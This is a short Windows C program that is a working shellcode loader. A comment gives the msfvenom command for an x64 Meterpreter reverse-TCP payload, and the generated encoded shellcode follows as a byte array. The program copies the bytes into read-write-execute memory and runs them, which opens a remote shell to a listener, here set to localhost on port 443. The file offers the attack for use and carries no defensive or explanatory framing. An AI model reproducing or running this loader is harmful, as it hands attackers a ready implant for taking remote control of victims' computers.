#include <Windows.h>

int main()
{
	//msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=127.0.0.1 lport=443 exitfunc=thread -f c -b \x00\x0c
	unsigned char buf[] =
		"\x48\x31\xc9\x48\x81\xe9\xc0\xff\xff\xff\x48\x8d\x05\xef"
		"\xff\xff\xff\x48\xbb\x50\xef\x82\xe1\xb7\x5d\x82\x1d\x48"
		"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xac\xa7\x01"
		"\x05\x47\xb5\x4e\x1d\x50\xef\xc3\xb0\xf6\x0d\xd0\x55\x61"
		"\x3d\xd3\x84\xff\xd6\xd0\x7d\x06\xa7\x09\xb3\xaf\x15\x09"
		"\x4f\x70\xa2\xb3\x28\xff\xd6\xf0\x4d\x18\xe0\x35\xab\xfd"
		"\x15\xb3\xdd\xfc\xd3\xe3\x9d\xb5\x71\xa2\x5c\x91\x26\x8f"
		"\xa0\xb6\x9c\x60\xf0\x02\xa7\x09\xb3\x97\xd6\xc0\x21\x11"
		"\xbe\xca\xe0\x67\x3b\x03\x65\x48\xe4\x80\xee\x32\x2f\x82"
		"\x1d\x50\x64\x02\x69\xb7\x5d\x82\x55\xd5\x2f\xf6\x86\xff"
		"\x5c\x52\x96\x18\xf7\xd2\xa5\x3c\x1d\xa2\x54\x51\x3f\x61"
		"\xb7\xfa\x6c\x4b\x55\xaf\x26\xc3\x6a\x83\xd5\xca\x1c\x86"
		"\xa7\xb3\x21\x1b\x1c\x43\xd4\x5d\xae\x83\x20\x8f\xbd\xf7"
		"\xec\x1c\xec\xce\xc5\xbf\x18\xbb\xcc\x25\x37\xda\xa5\x3c"
		"\x1d\xa6\x54\x51\x3f\xe4\xa0\x3c\x51\xca\x59\xdb\xaf\x9e"
		"\xa8\xb6\x8d\xc3\x96\x54\x67\xca\xe0\x67\x1c\xda\x5c\x08"
		"\xb1\xdb\xbb\xf6\x05\xc3\x44\x11\xb5\xca\x62\x5b\x7d\xc3"
		"\x4f\xaf\x0f\xda\xa0\xee\x07\xca\x96\x42\x06\xc9\x1e\x48"
		"\xa2\xdf\x54\xee\x98\xf1\xd3\xe8\x6e\xb0\x1d\x50\xae\xd4"
		"\xa8\x3e\xbb\xca\x9c\xbc\x4f\x83\xe1\xb7\x14\x0b\xf8\x19"
		"\x53\x80\xe1\xb6\xe6\xfd\x1d\x50\xee\xc3\xb5\xfe\xd4\x66"
		"\x51\xd9\x1e\xc3\x5b\xfb\x2a\xa4\x1a\xaf\x3a\xce\x68\x5d"
		"\x35\x83\x1c\x50\xef\xdb\xa0\x0d\x74\x02\x76\x50\x10\x57"
		"\x8b\xbd\x1c\xdc\x4d\x00\xa2\xb3\x28\xfa\x6c\x42\x55\xaf"
		"\x2f\xca\x68\x75\x15\x7d\xdd\x18\x66\x43\xa0\x0d\xb7\x8d"
		"\xc2\xb0\x10\x57\xa9\x3e\x9a\xe8\x0d\x11\xb7\xce\x68\x55"
		"\x15\x0b\xe4\x11\x55\x1b\x44\xc3\x3c\x7d\xc8\xd5\x2f\xf6"
		"\xeb\xfe\xa2\x4c\x68\xb5\x07\x11\xe1\xb7\x5d\xca\x9e\xbc"
		"\xff\xca\x68\x55\x10\xb3\xd4\x3a\xeb\xc3\xb9\xff\xd4\x7b"
		"\x5c\xea\xed\x5b\x29\xe8\xa2\x57\x9e\xa8\xef\xfc\xb4\xff"
		"\xde\x46\x3d\x0e\x66\x74\x8b\xf7\x1c\xdb\x75\x50\xff\x82"
		"\xe1\xf6\x05\xca\x94\xa2\xa7\xb3\x28\xf6\xe7\xda\xb9\x03"
		"\x0a\x7d\x34\xff\xd4\x41\x54\xd9\x28\xcf\xd0\x7e\x14\x0b"
		"\xed\x18\x66\x58\xa9\x3e\xa4\xc3\xa7\x52\x36\x4a\xbe\x48"
		"\x88\x01\xe5\x50\x92\xaa\xb9\xf6\x0a\xdb\x75\x50\xaf\x82"
		"\xe1\xf6\x05\xe8\x1d\x0a\xae\x38\xea\x98\x52\xb2\xe2\x85"
		"\xb8\xdb\xa0\x0d\x28\xec\x50\x31\x10\x57\xa8\x48\x93\x6b"
		"\x21\xaf\x10\x7d\xa9\xb6\x9e\xca\x34\x96\xa7\x07\x17\xc2"
		"\xe9\xc3\xe2\xb7\xb7\xe8\xe1\xee\x14\x45\xdf\xa0\x5a\x20"
		"\xb7\x48\x88\x82\x1d";

	void* exec = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, buf, sizeof(buf));
	((void(*)())exec)();
	
	return 0;
}

